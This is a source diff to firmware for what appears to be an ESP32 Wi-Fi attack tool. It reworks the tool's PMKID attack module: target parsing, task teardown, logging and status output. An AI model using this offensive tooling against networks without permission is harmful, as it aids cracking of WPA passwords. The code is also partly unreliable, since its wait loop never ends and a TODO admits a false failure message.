@@ -23,6 +23,19 @@ ESP_EVENT_DECLARE_BASE(ARMAMENT_ATTACK_STATUS_EVENT_BASE);
 static TaskHandle_t pmkid_sniff_task_handle = NULL;
 static uint8_t u_target_bssid[6];
 
+void arma_pmkid_set_target(char *target_bssid) {
+  for (uint8_t i = 0; i < 6; i++) {
+    uint8_t s1 = target_bssid[i + i];
+    uint8_t s2 = target_bssid[i + i + 1];
+    u_target_bssid[i] = convert_to_uint8_t(s1, s2);
+  }
+  printf(
+      "arma_pmkid.arma_pmkid_set_target > Set target AP: "
+      "%02X%02X%02X%02X%02X%02X\n",
+      u_target_bssid[0], u_target_bssid[1], u_target_bssid[2],
+      u_target_bssid[3], u_target_bssid[4], u_target_bssid[5]);
+}
+
 void pmkid_notif(void *args, esp_event_base_t event_base, int32_t event_id,
                  void *event_data) {
   arma_atk_event_data_t *notification_data;
@@ -30,8 +43,8 @@ void pmkid_notif(void *args, esp_event_base_t event_base, int32_t event_id,
 
   if (notification_data->atk_context == PMKID_BASED) {
     printf("arma_pmkid.pmkid_notif > Received PMKID attack notification\n");
-    arma_delete_task_pmkid_sniff_duration();
     arma_pmkid_finishing_sequence();
+    output_success_pmkid_attack(u_target_bssid);
   }
 }
 
@@ -56,6 +69,9 @@ void arma_delete_task_pmkid_sniff_duration() {
   if (pmkid_sniff_task_handle != NULL) {
     vTaskDelete(pmkid_sniff_task_handle);
     pmkid_sniff_task_handle = NULL;
+    printf(
+        "arma_pmkid.arma_delete_task_pmkid_sniff_duration > PMKID sniff "
+        "duration task deleted\n");
   }
 }
 
@@ -68,14 +84,21 @@ void arma_pmkid_finishing_sequence() {
   arma_pmkid_notif_event_unregister();
   wifi_sniffer_stop();
   wifi_disconnect_from_ap(u_target_bssid);
+  arma_delete_task_pmkid_sniff_duration();
 }
 
 void arma_pmkid_sniff_duration() {
+  printf(
+      "arma_pmkid.arma_pmkid_sniff_duration > PMKID sniff duration task "
+      "created\n");
+  output_pmkid_operation_started(u_target_bssid);
+  int currentTime = 0;
+
   while (1) {
-    vTaskDelay(5000 / portTICK_PERIOD_MS);
-    output_failed_pmkid_attack(u_target_bssid);
-    arma_pmkid_finishing_sequence();
-    arma_delete_task_pmkid_sniff_duration();
+    vTaskDelay(1000 / portTICK_PERIOD_MS);
+    printf("arma_pmkid.arma_pmkid_sniff_duration > (%d) Waiting for PMKID\n",
+           currentTime);
+    currentTime++;
   }
 }
 
@@ -113,17 +136,13 @@ uint8_t calc_len_ssid_name(uint8_t *ssid_name) {
 }
 
 void arma_pmkid(char *target_bssid) {
-  for (uint8_t i = 0; i < 6; i++) {
-    uint8_t s1 = target_bssid[i + i];
-    uint8_t s2 = target_bssid[i + i + 1];
-    u_target_bssid[i] = convert_to_uint8_t(s1, s2);
-  }
-
+  arma_pmkid_set_target(target_bssid);
   wifi_scan_aps();
+
   ap_list_from_scan_t *ap_list = wifi_get_scanned_aps();
   wifi_ap_record_t *ap_records = ap_list->ap_record_list;
   uint16_t total_scanned_aps = ap_list->count;
-  printf("arma_mic.arma_mic > Found %u APs\n", total_scanned_aps);
+  printf("arma_pmkid.arma_pmkid > Found %u APs\n", total_scanned_aps);
 
   for (uint16_t i = 0; i < total_scanned_aps; i++) {
     wifi_ap_record_t ap_record = ap_records[i];
@@ -142,4 +161,6 @@ void arma_pmkid(char *target_bssid) {
       break;
     }
   }
+  // TODO: Fix showing even if AP is found
+  output_failed_pmkid_not_found_ap(u_target_bssid);
 }
